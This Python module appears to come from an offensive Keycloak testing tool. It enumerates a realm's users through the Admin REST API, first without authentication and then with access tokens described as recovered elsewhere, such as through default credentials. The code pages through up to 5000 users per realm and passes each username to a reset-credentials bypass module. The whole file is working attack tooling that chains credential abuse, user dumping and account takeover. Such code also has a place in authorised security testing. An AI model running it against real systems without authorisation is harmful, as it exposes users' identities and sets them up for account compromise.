#!/usr/bin/env python3
"""Admin Users API enumeration — *list* usernames instead of fuzzing them.

Keycloak exposes no anonymous user directory: unauthenticated vectors (token
error messages, timing, registration/reset oracles) only *confirm a guess*. The
one endpoint that actually enumerates (dumps) users is the Admin REST API:

    GET /admin/realms/{realm}/users?first=0&max=100
    GET /admin/realms/{realm}/users/count

It requires a bearer token carrying view-users / query-users (realm-management).
This module:
  * tries the endpoint UNAUTHENTICATED (rare, but a bad reverse-proxy may leak it)
  * dumps the full list with any access token recovered elsewhere (e.g. default
    credentials found by the credential module — an admin-cli token on `master`
    can list users of every realm).

Every username found is pushed to the reporter as a UserEnum finding, so the
reset-credentials bypass module reuses them automatically.
"""

from utils.style import Colors, Identify
from utils.output import get_reporter

_PAGE = 100
_MAX_PAGES = 50  # hard cap: up to 5000 users dumped per realm


def _base_and_name(realm):
    """('https://host', 'foo') from 'https://host/realms/foo'."""
    r = realm.rstrip("/")
    if "/realms/" in r:
        base, name = r.split("/realms/", 1)
        return base, name.strip("/")
    return r, ""


def _fetch_users(s, base, realm_name, token=None):
    """Return (status, users[]) — paginated dump. users are raw JSON dicts."""
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    users = []
    first = 0
    last_status = None
    for _ in range(_MAX_PAGES):
        try:
            r = s.get(
                f"{base}/admin/realms/{realm_name}/users",
                params={"first": first, "max": _PAGE},
                headers=headers,
                allow_redirects=False,
            )
        except Exception:
            break
        last_status = r.status_code
        if r.status_code != 200:
            break
        try:
            batch = r.json()
        except Exception:
            break
        if not isinstance(batch, list) or not batch:
            break
        users.extend(batch)
        if len(batch) < _PAGE:
            break
        first += _PAGE
    return last_status, users


def _report_users(reporter, realm, users, source):
    for u in users:
        if not isinstance(u, dict):
            continue
        name = u.get("username") or u.get("email") or u.get("id")
        if not name:
            continue
        enabled = u.get("enabled", True)
        state = "" if enabled else " (disabled)"
        email = u.get("email", "")
        detail = f"{source} | email={email} enabled={enabled}"
        print(f"  └── {Colors.GREEN}[LIST] {name}{state}{Colors.RESET}")
        if reporter:
            reporter.add(
                "UserEnum", "medium",
                f"Valid user found: {name}",
                f"{realm}/../admin/realms",
                detail,
            )


def dump_users(s, realms, tokens=None):
    """Try to LIST users on each realm — unauth first, then with any token.

    `tokens` is an iterable of (label, access_token) recovered elsewhere.
    Returns the set of usernames found.
    """
    reporter = get_reporter()
    tokens = list(tokens or [])
    found = set()

    print(f"{Colors.CYAN} ├ Admin Users API (list, not fuzz) {Colors.RESET}")
    printed_header = False

    for realm in realms:
        base, name = _base_and_name(realm)
        if not name:
            continue

        # 1) Unauthenticated attempt (should be 401; a broken proxy may 200)
        status, users = _fetch_users(s, base, name, token=None)
        if status == 200 and users:
            printed_header = True
            print(f"  └── {Identify.confirmed}")
            print(f"       {Colors.RED}[!!!] Admin Users API exposed WITHOUT auth on "
                  f"realm '{name}' — {len(users)} user(s){Colors.RESET}")
            _report_users(reporter, realm, users, "admin API (unauthenticated!)")
            if reporter:
                reporter.add(
                    "Misconfiguration", "critical",
                    f"Admin Users API reachable unauthenticated (realm '{name}')",
                    f"{base}/admin/realms/{name}/users",
                    "GET returned the full user list with no bearer token",
                )
            for u in users:
                n = u.get("username") if isinstance(u, dict) else None
                if n:
                    found.add(n)
            continue  # already dumped this realm

        # 2) Authenticated dump with any recovered token
        for label, token in tokens:
            if not token:
                continue
            status, users = _fetch_users(s, base, name, token=token)
            if status == 200 and users:
                printed_header = True
                print(f"  └── {Colors.GREEN}[LIST] realm '{name}' via {label}: "
                      f"{len(users)} user(s){Colors.RESET}")
                _report_users(reporter, realm, users, f"admin API via {label}")
                for u in users:
                    n = u.get("username") if isinstance(u, dict) else None
                    if n:
                        found.add(n)
                break  # this realm is dumped, no need to try other tokens

    if not printed_header:
        print(f"  └── {Colors.THISTLE}Admin Users API not accessible "
              f"(needs a token with view-users){Colors.RESET}")

    return found
